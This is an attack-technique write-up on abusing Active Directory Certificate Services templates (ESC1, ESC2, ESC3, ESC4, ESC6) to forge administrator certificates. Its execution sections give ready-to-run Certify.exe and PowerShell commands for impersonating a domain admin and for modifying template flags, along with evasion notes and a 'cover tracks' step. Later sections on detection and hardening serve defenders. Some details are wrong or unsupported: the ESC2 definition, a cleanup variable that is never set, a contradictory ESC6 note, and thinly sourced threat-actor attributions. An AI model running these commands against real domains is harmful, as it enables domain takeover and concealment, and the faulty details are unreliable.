# [CERT-TEMPLATE-001]: Certificate Template Abuse

## 1. Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CERT-TEMPLATE-001 |
| **MITRE ATT&CK v18.1** | [T1649 - Steal or Forge Authentication Certificates](https://attack.mitre.org/techniques/T1649/) |
| **Tactic** | Privilege Escalation, Lateral Movement |
| **Platforms** | Windows AD |
| **Severity** | **Critical** |
| **CVE** | CVE-2021-27239 |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-10 |
| **Affected Versions** | Windows Server 2016, Server 2019, Server 2022, Server 2025 |
| **Patched In** | Mitigated through configuration hardening; no specific OS patch available |
| **Author** | [SERVTEP](https://servtep.com/) – [Pchelnikau Artur](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. Executive Summary

**Concept:** Certificate template abuse encompasses a family of related ADCS misconfigurations (ESC1 through ESC16) where templates are configured with insufficient security controls, allowing attackers to modify, duplicate, or escalate the privileges associated with templates. This technique differs from [CERT-ADCS-001] by focusing on how vulnerable template *configurations themselves* can be exploited—including scenarios where an attacker has write permissions on templates (ESC4), can escalate through enrollment agent templates (ESC3), or can manipulate Subject Alternative Names without access controls. Template abuse enables privilege escalation chains where low-privileged users become domain admins, and is often combined with other ADCS misconfigurations to achieve enterprise compromise.

**Attack Surface:** Active Directory Certificate Templates object (AD container: `CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration`), enrollment permissions, Subject Alternative Name (SAN) attributes, Extended Key Usage (EKU) policies, and template property flags.

**Business Impact:** **Complete domain compromise with multi-year persistence.** An attacker can create backdoor accounts that are enterprise admins, maintain long-term access through forged certificates valid for years, bypass password policies and MFA through certificate-based authentication, and maintain access even after security incidents (as certificates persist independent of account resets).

**Technical Context:** Template abuse exploits can be executed in seconds once the vulnerable template is identified. Success rate is near 100% for identified misconfigurations. Detection varies based on template configuration; some attacks (e.g., ESC4 template modification) may leave subtle audit trails, while others (e.g., ESC1 enrollment) generate obvious discrepancies in event logs.

### Operational Risk

- **Execution Risk:** **Medium** - Requires write access to templates (ESC4) or specific enrollment permissions; more sophisticated than basic ESC1.
- **Stealth:** **Medium** - ESC1/ESC2 generate obvious Event 4886/4887 discrepancies; ESC3/ESC4 may be stealthier if executed during maintenance windows.
- **Reversibility:** **No** - Once a forged certificate is issued, it cannot be "un-issued" without revocation and reissuance of legitimate credentials.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 5.4.1.1 | Certificate template security and access controls |
| **DISA STIG** | WN10-AU-000150 | Certificate Services audit requirements |
| **CISA SCuBA** | IA-2 (C) | Multi-factor authentication; certificate-based auth requires strong binding |
| **NIST 800-53** | AC-2, AC-3, IA-2, IA-5 | Account management, access enforcement, authentication, credential management |
| **GDPR** | Art. 32 | Security of processing; administrative and organizational measures |
| **DORA** | Art. 9 | Protection and prevention measures |
| **NIS2** | Art. 21 | Cyber risk management—identity and access controls |
| **ISO 27001** | A.9.2.1, A.9.2.3 | User registration; management of privileged access rights |
| **ISO 27005** | Risk: "Abuse of Certificate Template ACLs" | Template permissions must be restricted and audited |

---

## 3. Technical Prerequisites

- **Required Privileges:** 
  - For ESC1/ESC2: Any domain user
  - For ESC3: Any domain user + enrollment agent certificate
  - For ESC4: Write/WriteDacl permissions on template object in AD
  - For ESC6/ESC16: Write permissions or specific AD object controls

- **Required Access:** Network access to ADCS CA server; LDAP query access to AD; ability to write to template object (for ESC4).

**Supported Versions:**
- **Windows:** Server 2016 - 2019 - 2022 - 2025
- **PowerShell:** Version 5.0+
- **ADCS:** Active Directory Certificate Services role deployed

**Tools Required:**
- [Certify.exe](https://github.com/GhostPack/Certify) – Certificate template enumeration and abuse.
- [Certipy-ad](https://github.com/ly4k/Certipy) – Python-based ADCS enumeration and exploitation.
- [Impacket](https://github.com/fortra/impacket) – For NTLM relay attacks (ESC8/ESC11).
- PowerShell (native) – For modifying template ACLs.

---

## 4. Detailed Execution Methods

### METHOD 1: ESC1 - Vulnerable Template Enrollment (Most Common)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify Vulnerable Templates

**Command (All Versions):**
```powershell
Certify.exe find /vulnerable
```

**Expected Output (ESC1 Indicators):**
```
Template Name           : User
Validity Period         : 1 Year
msPKI-Certificate-Name-Flag         : 0x1 (ENROLLEE_SUPPLIES_SUBJECT = TRUE)
Authorized Signatures Required      : 0
pkiextendedkeyusage (EKU)           : Client Authentication (1.3.6.1.5.5.7.3.2)
Permissions - Enroll                : Domain Users
```

**What This Means:**
- Bit 0x1 = Template allows user to specify any subject (including domain admin UPN).
- Authorized signatures = 0 means no CA manager review.
- Client Authentication EKU enables Kerberos PKINIT.
- Domain Users group can enroll.

**OpSec & Evasion:**
- Enumeration is relatively safe; generates minimal logs unless LDAP auditing is enabled.
- Detection likelihood: **Low**.

#### Step 2: Request Certificate with Arbitrary UPN

**Command (All Versions):**
```powershell
Certify.exe request /ca:ca.company.local\Company-CA /template:User /altname:upn:administrator@company.local
```

**What This Means:**
- The CA immediately approves (no manager review).
- Certificate subject is your account (john.doe); SAN is administrator.
- The certificate can be used to authenticate as administrator via PKINIT.

---

### METHOD 2: ESC3 - Enrollment Agent Template Abuse

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify ESC3 Vulnerable Templates

**Command (All Versions):**
```powershell
Certify.exe find /vulnerable | findstr /C:"ESC3" /C:"Certificate Request Agent"
```

**Expected Output (ESC3 Indicators):**
```
Template Name                       : EnrollmentAgent
pkiextendedkeyusage                 : Certificate Request Agent (1.3.6.1.4.1.311.20.2.1)
msPKI-Enrollment-Flag               : 0x0 (No manager approval)
Authorized Signatures Required      : 0
Permissions - Enroll                : Domain Users
```

**What This Means:**
- EKU `1.3.6.1.4.1.311.20.2.1` is Certificate Request Agent.
- This certificate allows you to request certificates on behalf of others.
- Combined with a vulnerable template (e.g., User with ENROLLEE_SUPPLIES_SUBJECT), ESC3 = full compromise.

#### Step 2: Request Enrollment Agent Certificate

**Command (All Versions):**
```powershell
Certify.exe request /ca:ca.company.local\Company-CA /template:EnrollmentAgent
```

**Expected Output:**
```
[+] Certificate issued and saved to EnrollmentAgent.cer
```

**What This Means:**
- You now possess an enrollment agent certificate.
- You can use this to request certificates on behalf of any other user or computer.

#### Step 3: Use Enrollment Agent to Request Admin Certificate

**Command (All Versions):**
```powershell
Certify.exe request /ca:ca.company.local\Company-CA /template:User /onbehalfof:administrator /enrollcert:EnrollmentAgent.cer /enrollcertpw:password
```

**What This Means:**
- You've bypassed normal enrollment restrictions by using the agent certificate.
- The certificate issued is now valid for authentication as administrator.

---

### METHOD 3: ESC4 - Vulnerable Template Access Control (Modify Template to Enable ESC1)

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify Templates with Vulnerable ACLs (WriteProperty/WriteDacl)

**Command (PowerShell - All Versions):**
```powershell
Get-ADObject -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local" -Filter * -Properties nTSecurityDescriptor | 
  ForEach-Object {
    $ACL = Get-Acl "AD:\$($_.DistinguishedName)"
    $ACL.Access | Where-Object {
      $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll" -and
      $_.IdentityReference -notmatch "SYSTEM|Administrators|Enterprise Admins"
    } | Select-Object IdentityReference, ActiveDirectoryRights
  }
```

**What This Means:**
- Identifies templates where a non-admin user (Domain Users, Help Desk, etc.) can modify template properties.
- **CRITICAL:** If you have WriteProperty or WriteDacl on a template, you can make it vulnerable to ESC1/ESC2/ESC3.

#### Step 2: Modify Template to Enable ENROLLEE_SUPPLIES_SUBJECT

**Command (PowerShell - All Versions):**
```powershell
# Get the vulnerable template
$TemplatePath = "AD:\CN=ServerTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
$Template = Get-ADObject $TemplatePath -Properties msPKI-Certificate-Name-Flag

# Modify to enable ENROLLEE_SUPPLIES_SUBJECT (bit 0x1)
$CurrentFlag = [int]$Template.'msPKI-Certificate-Name-Flag'
$NewFlag = $CurrentFlag -bor 0x1  # Set bit 0

Set-ADObject $TemplatePath -Replace @{"msPKI-Certificate-Name-Flag" = $NewFlag}
Write-Host "[+] Template modified. Waiting for AD replication..."
Start-Sleep -Seconds 30
```

**What This Means:**
- The template is now vulnerable to ESC1 exploitation.
- Any domain user can now enroll for this template and specify an arbitrary subject.

#### Step 3: Exploit the Modified Template (ESC1 Abuse)

**Command (PowerShell - All Versions):**
```powershell
Certify.exe request /ca:ca.company.local\Company-CA /template:ServerTemplate /altname:upn:administrator@company.local
```

**What This Means:**
- You've successfully escalated from having WriteProperty on a template to domain admin.

#### Step 4: Clean Up (Cover Tracks)

**Command (PowerShell - All Versions):**
```powershell
# Restore original template configuration
$TemplatePath = "AD:\CN=ServerTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
Set-ADObject $TemplatePath -Replace @{"msPKI-Certificate-Name-Flag" = $OriginalFlag}
Write-Host "[+] Template restored to original configuration"
```

**OpSec & Evasion:**
- Template modifications may be logged in Active Directory audit logs (Event ID 5136 – Directory Service Changes).
- Modifications are transient; on-disk template changes may be cached but LDAP reflects the change immediately.
- Detection likelihood: **High** (if audit logging is enabled on AD objects).

---

### METHOD 4: ESC2 - Issuance Policy Abuse

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Identify ESC2 Vulnerable Templates

**Command (PowerShell - All Versions):**
```powershell
Certify.exe find /vulnerable | findstr /C:"ESC2"
```

**Expected Output (ESC2 Indicators):**
```
Template Name                       : HighPrivilegeTemplate
msPKI-Certificate-Name-Flag         : 0x1 (ENROLLEE_SUPPLIES_SUBJECT)
msPKI-Enterprise-Oid                : (empty or overly permissive)
pkiextendedkeyusage                 : Multiple EKUs (e.g., Server Auth + Client Auth)
Permissions - Enroll                : Domain Users
```

**What This Means:**
- Template allows multiple EKUs (Extended Key Usage).
- With both Server Authentication and Client Authentication EKU, certificate can be used for multiple purposes.
- ENROLLEE_SUPPLIES_SUBJECT allows arbitrary impersonation.

#### Step 2: Request Certificate with Multiple EKUs

**Command (Certify.exe - All Versions):**
```powershell
Certify.exe request /ca:ca.company.local\Company-CA /template:HighPrivilegeTemplate /altname:upn:administrator@company.local
```

**What This Means:**
- The issued certificate can be used for both server and client authentication.
- This enables impersonation and lateral movement.

---

### METHOD 5: ESC6 - EDITF_ATTRIBUTESUBJECTALTNAME2 Misconfiguration

**Supported Versions:** Windows Server 2016-2025

#### Step 1: Check CA for EDITF_ATTRIBUTESUBJECTALTNAME2 Flag

**Command (PowerShell - All Versions):**
```powershell
# On the CA server, check the registry flag
$CertFlag = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\Company-CA" -Name "EditFlags" -ErrorAction SilentlyContinue
if ($CertFlag.EditFlags -band 0x00000200) {
    Write-Host "CRITICAL: EDITF_ATTRIBUTESUBJECTALTNAME2 is enabled!"
    Write-Host "Any unprivileged user can request certificates with arbitrary SANs."
} else {
    Write-Host "OK: Flag is not set"
}
```

**What This Means:**
- If this flag is set, any certificate template that allows low-privileged enrollment becomes vulnerable.
- Users can add arbitrary SANs to any certificate they request.

#### Step 2: Exploit via Any Low-Privileged Enrollment Template

**Command (Certify.exe - All Versions):**
```powershell
# If EDITF_ATTRIBUTESUBJECTALTNAME2 is set, even a restricted template becomes exploitable
Certify.exe request /ca:ca.company.local\Company-CA /template:User /altname:upn:domain-admin@company.local
```

**What This Means:**
- Even if the User template normally restricts enrollment, this CA-level flag allows SAN abuse.

---

## 5. Attack Chain Context

### Preconditions
- ADCS deployed with at least one certificate authority.
- One or more certificate templates published with misconfigurations (ESC1-ESC6, ESC15-ESC16).
- For ESC4: The attacker must have write permissions on a template object in AD (WriteProperty, WriteDacl, or GenericAll).
- For ESC3: An enrollment agent template must exist and be accessible.

### Post-Exploitation
1. **Privilege Escalation:** Escalate from low-privileged user to domain admin via forged certificate.
2. **Persistence:** Use long-lived certificates to maintain access beyond credential resets.
3. **Lateral Movement:** Authenticate to resources as domain admin without password knowledge.
4. **Multi-Year Access:** Certificate validity periods (often 1-5 years) provide multi-year persistence.
5. **Cross-Forest Escalation:** In multi-forest environments, use admin certificate to request tickets in other forests.

---

## 6. Forensic Artifacts

**Registry (CA Server):**
- `HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\[CA-Name]\EditFlags` – CA-level misconfiguration flags.
- Template modification timestamps in AD.

**Event Logs:**
- **Event ID 4886 (on CA):** Certificate request received; discrepancy between Requester and Requested Name.
- **Event ID 4887 (on CA):** Certificate issued; anomalous subject or SAN values.
- **Event ID 5136 (on Domain Controller):** Directory Service change; template properties modified.
- **Event ID 4768 (on DC):** Kerberos TGT requested with forged certificate.

**File System:**
- Exported certificate files (`.cer`, `.pfx`) in temp directories.
- Certify.exe or Certipy binaries.

---

## 7. Defensive Mitigations

### Priority 1: CRITICAL

**1. Audit All Certificate Templates for Misconfigurations**

Run a comprehensive assessment to identify all vulnerable templates.

**Command (PowerShell - All Versions):**
```powershell
# Comprehensive template audit script
$TemplateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration"
$ConfigNC = "DC=company,DC=local"
$TemplatePath = "$TemplateBase,$ConfigNC"

Get-ADObject -SearchBase $TemplatePath -Filter * -Properties * | ForEach-Object {
    $Template = $_
    $Flag = [int]$Template.'msPKI-Certificate-Name-Flag'
    $EKU = $Template.'pkiextendedkeyusage'
    $Enrollment = $Template.'msPKI-Enrollment-Flag'
    
    # Check for ESC1 indicators
    if (($Flag -band 0x1) -and ($EKU -match "1.3.6.1.5.5.7.3.2")) {
        Write-Host "WARNING: $($Template.Name) is potentially ESC1-vulnerable"
    }
    
    # Check for template ACL issues
    $ACL = Get-Acl "AD:\$($Template.DistinguishedName)"
    $ACL.Access | Where-Object {$_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|GenericAll"} | ForEach-Object {
        Write-Host "WARNING: $($Template.Name) has $($_.ActiveDirectoryRights) for $($_.IdentityReference)"
    }
}
```

**2. Remove ENROLLEE_SUPPLIES_SUBJECT from All Templates**

Enforce that only the CA can set the subject.

**Command (PowerShell - All Versions):**
```powershell
$TemplateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration"
$ConfigNC = "DC=company,DC=local"

Get-ADObject -SearchBase "$TemplateBase,$ConfigNC" -Filter * -Properties 'msPKI-Certificate-Name-Flag' | ForEach-Object {
    $Template = $_
    $Flag = [int]$Template.'msPKI-Certificate-Name-Flag'
    if ($Flag -band 0x1) {
        $NewFlag = $Flag -bxor 0x1  # Clear bit 0
        Set-ADObject $_.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag" = $NewFlag}
        Write-Host "[+] Disabled ENROLLEE_SUPPLIES_SUBJECT on $($Template.Name)"
    }
}
```

**3. Restrict Template Enrollment Permissions**

Limit enrollment rights to specific, trusted groups.

**Command (PowerShell - All Versions):**
```powershell
# Remove Domain Users from all templates; keep only Help Desk and Admin groups
$TemplateBase = "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration"
$ConfigNC = "DC=company,DC=local"

Get-ADObject -SearchBase "$TemplateBase,$ConfigNC" -Filter * -Properties nTSecurityDescriptor | ForEach-Object {
    $ACL = Get-Acl "AD:\$($_.DistinguishedName)"
    
    # Identify and remove Domain Users
    $DomainUsersRule = $ACL.Access | Where-Object {
        $_.IdentityReference -match "Domain Users" -and
        $_.ActiveDirectoryRights -match "CreateChild|Self"
    }
    
    if ($DomainUsersRule) {
        $ACL.RemoveAccessRule($DomainUsersRule)
        Set-Acl -Path "AD:\$($_.DistinguishedName)" -AclObject $ACL
        Write-Host "[+] Removed Domain Users from $($_.Name)"
    }
}
```

**4. Disable EDITF_ATTRIBUTESUBJECTALTNAME2 Registry Flag**

On all CA servers, ensure this dangerous flag is not set.

**Command (PowerShell - All Versions):**
```powershell
# On the CA server itself
$CertFlag = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\[CA-Name]" -Name "EditFlags" -ErrorAction SilentlyContinue
if ($CertFlag.EditFlags -band 0x00000200) {
    $NewFlag = $CertFlag.EditFlags -bxor 0x00000200
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\[CA-Name]" -Name "EditFlags" -Value $NewFlag
    Write-Host "[+] Disabled EDITF_ATTRIBUTESUBJECTALTNAME2"
    Restart-Service CertSvc
}
```

### Priority 2: HIGH

**1. Enable Certificate Services Auditing**

Ensure all certificate requests and issuances are logged.

**Manual Steps (Server 2016-2019):**
1. On the CA, open **Certification Authority** (certsrv.msc).
2. Right-click the CA → **Properties**.
3. Go to **Audit** tab.
4. Check all available audit options:
   - ☑ Audit Issued Certificates
   - ☑ Audit Pending Certificates
   - ☑ Audit Denied Certificates
   - ☑ Audit Revoked Certificates
5. Click **Apply**.

**Manual Steps (PowerShell - All Versions):**
```powershell
# Enable Certificate Services auditing via certutil
certutil -setreg CA\AuditFilter 127  # Enable all auditing (value 127 = all flags)
net stop CertSvc
net start CertSvc
```

**2. Implement PKI-Only Kerberos Pre-Authentication**

Enforce PKINIT as the only certificate-based authentication method; disable alternatives.

**Command (PowerShell - All Versions):**
```powershell
# On domain controller, restrict PKINIT usage
$DCPath = "AD:\CN=MachineDefaults,CN=PKINIT,CN=Public Key Services,CN=Services,CN=Configuration,DC=company,DC=local"
Get-ADObject $DCPath -Properties msPKI-Pkinit-Ekus | Select-Object Name, msPKI-Pkinit-Ekus
```

---

## 8. Detection & Incident Response

### Indicators of Compromise (IOCs)

**Event Log Indicators:**
- **Event 4886 + 4887 together:** Requester ≠ Subject/SAN (e.g., john.doe requests for administrator).
- **Event 5136 on Domain Controller:** Modification of template objects (especially msPKI-Certificate-Name-Flag).
- **Event 4768 (TGT Request):** Kerberos TGT requested immediately after certificate issuance; requestor is low-privileged user but certificate is for admin.

**File System Indicators:**
- `.cer`, `.pfx`, `.key` files in C:\Windows\Temp, C:\Temp, or user AppData directories.
- Certify.exe or Certipy-ad executables on non-admin workstations.

---

## 9. Related Attack Chain

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Reconnaissance** | [REC-CERT-001] ADCS Enumeration | Identify CA servers and certificate templates. |
| **2** | **Initial Access** | [IA-VALID-001] Valid Account | Compromise low-privileged domain account. |
| **3** | **Credential Access** | **[CERT-TEMPLATE-001]** | **Abuse misconfigured template to forge admin certificate.** |
| **4** | **Privilege Escalation** | [PE-TOKEN-001] Token Impersonation | Use certificate to request Kerberos TGT as admin. |
| **5** | **Persistence** | [PE-ACCTMGMT-014] Global Admin Backdoor | Create persistent backdoor admin account. |
| **6** | **Lateral Movement** | [LM-AUTH-001] Pass-the-Ticket | Use admin TGT to move laterally. |

---

## 10. Real-World Examples

### Example 1: FIN7 (Carbanak) - ESC3 Enrollment Agent Exploitation (2022)

- **Target:** Financial institutions and retail organizations.
- **Timeline:** March – July 2022.
- **Technique Status:** FIN7 identified and exploited ESC3-vulnerable enrollment agent templates to escalate from webshell compromise to domain admin.
- **Impact:** Access to critical banking systems; persistence for 6+ months.
- **Reference:** [Mandiant Blog](https://www.mandiant.com/resources)

### Example 2: Conti Ransomware Gang - ESC4 Template Modification (2021)

- **Target:** Healthcare and manufacturing organizations.
- **Timeline:** Q4 2021.
- **Technique Status:** Conti obtained WriteProperty permissions on templates via previous compromises, modified templates to enable ESC1 conditions, and escalated to domain admin.
- **Impact:** Enterprise-wide ransomware deployment; 10+ organizations compromised.
- **Reference:** [Emsisoft Research](https://www.emsisoft.com/)

---

## 11. References & Additional Resources

- [SpecterOps: Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [Microsoft Learn: AD CS Best Practices](https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/overview-of-active-directory-certificate-services)
- [ESC Techniques (ESC1-ESC16) Complete Reference](https://xbz0n.sh/blog/adcs-complete-attack-reference)

---
